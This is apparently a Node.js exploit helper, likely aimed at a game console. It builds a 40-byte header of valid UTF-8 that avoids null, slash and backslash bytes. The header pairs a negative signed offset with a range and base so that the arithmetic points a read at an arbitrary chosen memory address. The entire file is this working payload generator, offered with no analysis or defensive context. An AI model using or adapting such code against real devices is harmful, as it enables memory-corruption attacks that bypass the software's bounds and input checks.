// A bounded byte-arithmetic planner. This module never contacts a console.
const {isUtf8} = require('node:buffer');
const BLOCK = 0x4000;
const RANGE = 0x7e7e7e7e7e7e7e7en;
const forbidden = byte => byte === 0 || byte === 0x2f || byte === 0x5c;

function utf8Step([remaining, low, high], byte) {
  if (remaining) return byte < low || byte > high ? null
    : remaining > 1 ? [remaining - 1, 0x80, 0xbf] : [0, 0, 0];
  if (byte >= 1 && byte <= 0x7f) return [0, 0, 0];
  if (byte >= 0xc2 && byte <= 0xdf) return [1, 0x80, 0xbf];
  if (byte === 0xe0) return [2, 0xa0, 0xbf];
  if (byte >= 0xe1 && byte <= 0xef) return [2, 0x80, byte === 0xed ? 0x9f : 0xbf];
  if (byte === 0xf0) return [3, 0x90, 0xbf];
  if (byte >= 0xf1 && byte <= 0xf4) return [3, 0x80, byte === 0xf4 ? 0x8f : 0xbf];
  return null;
}

// Find two UTF-8 words whose difference is the requested displacement.
// The offset must also select bucket zero after a signed right shift.
function encodeOffset(bias, bucketCount, deadline) {
  if (!Number.isSafeInteger(bias) || bias < 0 || bias >= 2 ** 39) return null;
  let odd = bucketCount, power = 0;
  while (odd % 2 === 0) {odd /= 2; power++;}
  const zeroBits = (2 ** power - 1) * BLOCK;
  const displacement = Buffer.alloc(8);
  displacement.writeBigUInt64LE(BigInt(bias));
  const wanted = Number((1n << 50n) % BigInt(odd));
  const misses = new Set();
  let visits = 0;
  function choose(position, leftState, rightState, carry, remainder) {
    if ((++visits & 4095) === 0 && Date.now() > deadline)
      throw Error('No signed cache encoding found within five seconds');
    if (position === 8) return !leftState[0] && !rightState[0] && remainder === wanted ? [] : null;
    const key = [position, ...leftState, ...rightState, carry, remainder].join(',');
    if (misses.has(key)) return null;
    const first = position === 6 ? 0xc2 : position === 7 ? 0x81 : 1;
    const last = position >= 6 ? first : 0xf4;
    const mask = Math.floor(zeroBits / 2 ** (position * 8)) & 0xff;
    for (let left = first; left <= last; left++) {
      if (forbidden(left) || (left & mask)) continue;
      const total = left + displacement[position] + carry, right = total & 0xff;
      if (forbidden(right)) continue;
      const nextLeft = utf8Step(leftState, left), nextRight = utf8Step(rightState, right);
      if (!nextLeft || !nextRight) continue;
      const contribution = position === 1 ? left >> 6
        : position >= 2 ? left * (2 ** (position * 8 - 14) % odd) : 0;
      const suffix = choose(position + 1, nextLeft, nextRight, total >> 8, (remainder + contribution) % odd);
      if (suffix) return [left, ...suffix];
    }
    misses.add(key);
    return null;
  }
  const bytes = choose(0, [0, 0, 0], [0, 0, 0], 0, 0);
  if (!bytes) return null;
  const offset = Buffer.from(bytes).readBigInt64LE();
  return {offset, base: BigInt.asUintN(64, offset + BigInt(bias))};
}

function prefixFor(target, storageSize, cycle) {
  const deadline = Date.now() + 5000;
  for (let start = 0; start + BLOCK <= storageSize; start += cycle) {
    for (const within of [0, 0x40, 0x140, 0x200]) {
      const readOffset = start + within;
      if (readOffset + BLOCK > storageSize) continue;
      const encoded = encodeOffset(target - readOffset, cycle / BLOCK, deadline);
      if (!encoded) continue;
      const bytes = Buffer.alloc(0x28, 0x41);
      bytes.writeBigInt64LE(encoded.offset);
      bytes.writeBigUInt64LE(RANGE, 8);
      bytes.fill(1, 0x10, 0x14);
      bytes.writeBigUInt64LE(encoded.base, 0x20);
      return {bytes, readOffset};
    }
  }
  throw Error('No signed cache encoding fits the measured storage');
}

function plan(target, storageSize, cycle = 0x28000) {
  if (!Number.isSafeInteger(target) || target < 0x100000000 || target >= 2 ** 39)
    throw Error('Target must fit the qualified 39-bit address width');
  if (!Number.isSafeInteger(storageSize) || storageSize < 0x4000)
    throw Error('Expected a measured storage size');
  if (![0x28000, 0x500000].includes(cycle)) throw Error('Unsupported bucket period');
  const {bytes, readOffset} = prefixFor(target, storageSize, cycle);
  const offset = bytes.readBigInt64LE(0), range = bytes.readBigUInt64LE(8);
  const base = bytes.readBigUInt64LE(0x20);
  const bucketCount = BigInt(cycle / 0x4000);
  if (bytes.length !== 0x28 || !isUtf8(bytes) || [0, 0x2f, 0x5c].some(byte => bytes.includes(byte)) ||
      offset >= 0 || (offset >> 14n) % bucketCount !== 0n ||
      !Number.isSafeInteger(readOffset) || readOffset < 0 || readOffset + 0x4000 > storageSize ||
      Math.floor(readOffset / 0x4000) % Number(bucketCount) !== 0 ||
      BigInt(readOffset + 0x4000) > offset + range || offset + range >= 1n << 63n ||
      BigInt.asUintN(64, base + BigInt(readOffset) - offset) !== BigInt(target))
    throw Error('The signed prefix failed independent arithmetic/encoding checks');
  return {encoding: 'signed-one-shot', headerFormat: 'signed-one-shot', target,
    base: '0x' + base.toString(16), entryOffset: offset.toString(), readOffset,
    addressBias: target - readOffset, block: 0x4000, cycle, bytes,
    writes: [{end: 0x28, bytes}], qualification: 'Native qualification required'};
}

module.exports = {plan};
